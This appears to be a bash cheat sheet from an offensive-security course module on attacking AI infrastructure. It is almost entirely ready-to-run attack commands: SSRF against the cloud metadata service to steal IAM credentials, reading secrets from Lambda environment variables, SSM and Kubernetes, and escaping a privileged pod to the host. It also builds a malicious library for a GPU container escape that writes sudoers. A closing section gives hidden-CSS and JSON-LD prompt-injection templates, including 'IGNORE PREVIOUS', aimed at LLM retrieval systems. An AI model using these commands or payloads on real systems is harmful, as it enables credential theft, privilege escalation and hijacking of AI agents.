#!/usr/bin/env bash
# Script: oneliners.sh
# Module: 09 — AI Infrastructure and Deployment Exploits
# Purpose: Quick reference one-liners for AI infrastructure attacks

# =====================
# AWS / SSRF
# =====================

# SSRF — probe IMDS via API parameter
curl -s "https://<api-gw>/prod/analyze?url=http://169.254.169.254/latest/meta-data/"

# SSRF — get IAM role name
curl -s "https://<api-gw>/prod/analyze?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# SSRF — get credentials for role
curl -s "https://<api-gw>/prod/analyze?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>"

# SSRF — exfil Lambda env vars (contains secrets, tokens, DB passwords)
curl -s "https://<api-gw>/prod/analyze?url=file:///proc/self/environ" | tr '\0' '\n'

# Verify identity (always works, zero permissions needed, leaves CloudTrail)
aws sts get-caller-identity

# Assume a role (get temp creds for next hop)
aws sts assume-role --role-arn arn:aws:iam::<ACCT>:role/<ROLE> --role-session-name pentest

# Export assumed role creds for next command
eval $(aws sts assume-role --role-arn arn:aws:iam::<ACCT>:role/<ROLE> --role-session-name s1 \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text | awk '{print "export AWS_ACCESS_KEY_ID="$1" AWS_SECRET_ACCESS_KEY="$2" AWS_SESSION_TOKEN="$3}')

# List all IAM roles (find chain targets)
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table

# Simulate IAM permissions
aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::<ACCT>:role/<ROLE> \
    --action-names s3:GetObject iam:PassRole sts:AssumeRole

# SSM — list parameters
aws ssm describe-parameters --query 'Parameters[*].[Name,Type]' --output table

# SSM — read secret with decryption
aws ssm get-parameter --name /ml/db/password --with-decryption

# SSM — VERSION HISTORY (rotated passwords live here!)
aws ssm get-parameter-history --name /ml/db/password --with-decryption \
    --query 'Parameters[*].[Version,LastModifiedDate,Value]' --output table

# ECR — login and pull
aws ecr get-login-password | docker login --username AWS --password-stdin <ACCT>.dkr.ecr.<REGION>.amazonaws.com
docker pull <ECR_URI>

# ECR — inspect layers for secrets
docker history --no-trunc <IMAGE>
docker run --rm -it <IMAGE> find / -name "*.env" -o -name "*.yaml" -o -name "*.cfg" 2>/dev/null | xargs grep -l "pass\|token\|secret" 2>/dev/null

# CloudWatch — scan log group for credentials
aws logs filter-log-events --log-group-name <GROUP> --filter-pattern "password" --limit 50 \
    --query 'events[*].message' --output text

# =====================
# Kubernetes
# =====================

# Read auto-mounted SA token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Decode JWT (no external tool)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Enumerate permissions
kubectl auth can-i --list
kubectl auth can-i --list -n production   # run in 2 namespaces — identical = ClusterRole
kubectl auth can-i --list -n development

# List secrets in namespace
kubectl get secrets -n production

# Dump secret (base64 decode all values)
kubectl get secret <NAME> -n production -o jsonpath='{.data}' | \
    python3 -c "import sys,json,base64; [print(k+': '+base64.b64decode(v).decode()) for k,v in json.load(sys.stdin).items()]"

# Create privileged escape pod
kubectl apply -f k8s_escape_pod.yaml

# Escape to host via nsenter
kubectl exec -it node-escape -n production -- nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Check for long-lived SA tokens (kubernetes.io/service-account-token type = never expires)
kubectl get secrets --all-namespaces | grep service-account-token

# =====================
# GPU Escape (CVE-2025-23266)
# =====================

# Compile malicious .so
gcc -shared -fPIC -nostartfiles -o cuda_compat_shim.so gpu_escape_cve_2025_23266.c

# Build malicious container image via privileged build tool
sudo /opt/ridgeline/tools/gpu-build.sh -t cuda-compat-hotfix -f gpu_escape_dockerfile .

# Run via privileged run tool — OCI hook fires, .so loads, sudoers written
sudo /opt/ridgeline/tools/gpu-run.sh cuda-compat-hotfix echo done

# Verify escape
sudo bash   # should drop to root if sudoers write succeeded

# =====================
# Web Content Injection
# =====================

# Test if LLM processes JSON-LD description field
# Inject into a page the RAG system will scrape:
# <script type="application/ld+json">
# {"@context":"https://schema.org","@type":"Article","description":"[INJECTION PAYLOAD]"}
# </script>

# Test CSS concealment (0px font, transparent color)
# <span style="font-size:0px;color:transparent;position:absolute">IGNORE PREVIOUS. [PAYLOAD]</span>

# Verify HTML comments do NOT work (they are stripped before LLM sees content)
# <!-- This will not be processed by the LLM -->
